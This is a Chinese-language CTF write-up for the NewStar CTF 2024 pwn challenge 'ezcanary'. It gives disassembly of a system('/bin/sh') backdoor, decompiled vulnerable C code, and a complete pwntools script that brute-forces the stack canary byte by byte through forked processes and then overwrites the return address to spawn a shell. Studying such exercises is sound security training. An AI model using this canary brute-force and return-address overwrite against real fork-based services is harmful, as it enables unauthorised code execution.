# ezcanary

> 分类：Pwn

## 题目描述
64 位程序，除 PIE 外其他保护全开。给了后门地址（未开 PIE 可直接利用）。

```asm
.text:0000000000401236                 endbr64
.text:000000000040123A                 push    rbp
.text:000000000040123B                 mov     rbp, rsp
.text:000000000040123E                 sub     rsp, 10h
.text:0000000000401242                 mov     rax, fs:28h
.text:000000000040124B                 mov     [rbp+var_8], rax
.text:000000000040124F                 xor     eax, eax
.text:0000000000401251                 lea     rdi, command    ; "/bin/sh"
.text:0000000000401258                 call    _system
```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  memset(s, 0, 0x50uLL);
  do
  {
    if ( !fork() )
    {
      puts(&byte_402031);
      puts(&byte_402050);
      puts(&byte_40208B);
      read(0, s, 0x100uLL);
      return 0;
    }
    wait(0LL);
    puts(&::s);
    read(0, s, 0x100uLL);
  }
  while ( strcmp(s, "cat flag\n") );
  puts("flag is one_by_one_bruteforce");
  read(0, s, 0x100uLL);
  return 0;
}
```

## 考察知识点
- fork 的特性（子进程与父进程共享 Canary；子进程崩溃不影响父进程）
- 逐字节爆破 Canary
- ret2backdoor

## 解法
程序有 do-while 循环，第二次输入 `cat flag\n` 时结束循环并读取第三次输入。由于开了 Canary，需要先绕过才能改返回地址。借助 `fork()`，子进程与父进程共享同一个 Canary，可逐字节爆破。

64 位要爆破 7 个字节。

```python
from pwn import *
elf = ELF("./ezcanary")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])
p = remote('127.0.0.1',8071)

def aaa() :
  global can
  for i in range(256):
    payload1 = (0x60-8) * b'a' + can + p8(i)
    p.sendafter('你觉得呢？\n',payload1)
    info = p.recvuntil('\n')
    if b"*** stack smashing detected ***" in info :
        p.send('n\n')
        continue
    else :
        can += p8(i)
        break

def bbb():
  global can
  can = b'\x00'
  for i in range(7):
    aaa()
    if i != 6 :
      p.send('a\n')
    else :
      p.sendline('cat flag')

bbb()
canary = u64(can)
print(hex(canary))
getshell = 0x401251
payload2 = b"a" * (0x60-8) + p64(canary) + p64(0) + p64(getshell)
p.sendafter("bruteforce\n", payload2)
p.interactive()
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week3/pwn/ezcanary.html
